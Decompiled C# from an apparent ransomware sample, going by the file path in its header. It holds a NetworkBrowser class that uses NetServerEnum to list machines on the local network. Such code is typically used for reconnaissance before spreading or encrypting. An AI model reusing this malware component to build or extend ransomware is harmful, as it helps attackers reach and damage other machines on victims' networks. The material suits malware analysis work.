// Decompiled with JetBrains decompiler
// Type: osilokinom.NetworkBrowser
// Assembly: xaqipaxowq, Version=2.7.3.1, Culture=neutral, PublicKeyToken=null
// MVID: 717542D9-9F58-42E9-9315-5411271D63FD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Generic-1d16285d88d42a50c89fddfc9f1449b38b3f8e0e680f4b1b57bf88a4143a2812.exe

using System;
using System.Collections;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;

namespace osilokinom
{
  public sealed class NetworkBrowser
  {
    [SuppressUnmanagedCodeSecurity]
    [DllImport("Netapi32", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int NetServerEnum(
      string ServerNane,
      int dwLevel,
      ref IntPtr pBuf,
      int dwPrefMaxLen,
      out int dwEntriesRead,
      out int dwTotalEntries,
      int dwServerType,
      string domain,
      out int dwResumeHandle);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("Netapi32", SetLastError = true)]
    public static extern int NetApiBufferFree(IntPtr pBuf);

    public ArrayList getNetworkComputers()
    {
      ArrayList networkComputers = new ArrayList();
      int num1 = 1;
      int num2 = 2;
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      int dwEntriesRead = 0;
      int dwTotalEntries = 0;
      int dwResumeHandle = 0;
      int num3 = Marshal.SizeOf(typeof (NetworkBrowser._SERVER_INFO_100));
      try
      {
        if (NetworkBrowser.NetServerEnum((string) null, 100, ref zero1, -1, out dwEntriesRead, out dwTotalEntries, num1 | num2, (string) null, out dwResumeHandle) == 0)
        {
          for (int index = 0; index < dwTotalEntries; ++index)
          {
            NetworkBrowser._SERVER_INFO_100 structure = (NetworkBrowser._SERVER_INFO_100) Marshal.PtrToStructure(new IntPtr((int) zero1 + index * num3), typeof (NetworkBrowser._SERVER_INFO_100));
            networkComputers.Add((object) structure.sv100_name);
          }
        }
      }
      catch (Exception ex)
      {
        int num4 = (int) MessageBox.Show("Problem with acessing network computers in NetworkBrowser \r\n\r\n\r\n" + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        return (ArrayList) null;
      }
      finally
      {
        NetworkBrowser.NetApiBufferFree(zero1);
      }
      return networkComputers;
    }

    public struct _SERVER_INFO_100
    {
      internal int sv100_platform_id;
      [MarshalAs(UnmanagedType.LPWStr)]
      internal string sv100_name;
    }
  }
}
